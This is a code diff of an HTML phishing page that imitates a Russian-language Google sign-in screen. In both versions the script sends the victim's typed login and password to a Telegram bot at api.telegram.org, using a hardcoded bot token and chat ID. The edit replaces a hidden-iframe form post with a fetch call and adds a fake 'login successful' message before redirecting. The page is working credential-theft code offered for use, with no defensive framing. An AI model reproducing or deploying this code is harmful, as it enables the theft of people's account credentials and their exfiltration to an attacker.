@@ -2,61 +2,68 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
     <title>Вход</title>
 </head>
 <body>
 
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none;"></iframe>
-
     <div class="glav">
-        
-        <form id="tgForm" method="POST" target="hidden_iframe">
+        <div class="imue">
+            <img src="gglogo.png" class="imug">
+            <p class="sinin">Вход</p>
+            <p class="isp">Используйте аккаунт Google</p>
+            <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);">
+            <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);">
             
-            <input type="hidden" name="chat_id" value="6811862398">
-            <input type="hidden" name="text" id="tg_text">
-
-            <div class="imue">
-                <img src="gglogo.png" class="imug">
-                <p class="sinin">Вход</p>
-                <p class="isp">Используйте аккаунт Google</p>
-                
-                <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);" required>
-                <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);" required>
-                
-                <div id="status" style="color: rgb(200, 200, 200); font-family: Arial; font-size: 14px; margin-top: 10px; min-height: 18px;"></div>
-            </div>
-            
-            <button type="submit" id="button">Далее</button>
-            
-        </form>
+            <div id="status" style="color: #c2b9c2; font-family: Arial, sans-serif; font-size: 14px; margin-top: 15px; min-height: 20px;"></div>
+        </div>
+        <div class="button">
+            <button id="button">Далее</button>
+        </div>
     </div>
 
     <script>
         const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
-        
-        const form = document.getElementById("tgForm");
-        const inputLogin = document.getElementById("login");
-        const inputPass = document.getElementById("password");
-        const tgText = document.getElementById("tg_text");
+        const CHAT_ID = "6811862398";
+
+        const input = document.getElementById("login");
+        const input2 = document.getElementById("password");
         const btn = document.getElementById("button");
         const status = document.getElementById("status");
 
-        form.action = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        btn.addEventListener("click", () => {
+            // Проверяем, заполнил ли пользователь поля
+            if (!input.value || !input2.value) {
+                return alert("Введите логин и пароль");
+            }
 
-        form.addEventListener("submit", (e) => {
-            // Формируем текст
-            tgText.value = "Логин: " + inputLogin.value + "  Пароль:   " + inputPass.value;
-
-            // Визуальный статус
+            // Блокируем кнопку, чтобы не было спама запросами
             btn.disabled = true;
-            status.textContent = "Вход...";
+            status.textContent = "Проверка...";
 
-            // Имитируем переход на следующую страницу
-            setTimeout(() => {
-                window.location.href = "next.html";
-            }, 800);
+            const text = encodeURIComponent("Логин: " + input.value + "  Пароль:   " + input2.value);
+
+            // Отправляем данные обычным fetch
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`)
+            .then(res => res.json())
+            .then(res => {
+                if (res.ok) {
+                    status.textContent = "Вход выполнен успешно ✅";
+                    // Даем небольшую паузу (400 миллисекунд), чтобы юзер увидел галочку, и перенаправляем
+                    setTimeout(() => {
+                        window.location.href = "next.html";
+                    }, 400);
+                } else {
+                    status.textContent = "Ошибка сервера ❌";
+                    btn.disabled = false;
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                status.textContent = "Ошибка сети ❌";
+                btn.disabled = false;
+            });
         });
     </script>
 </body>
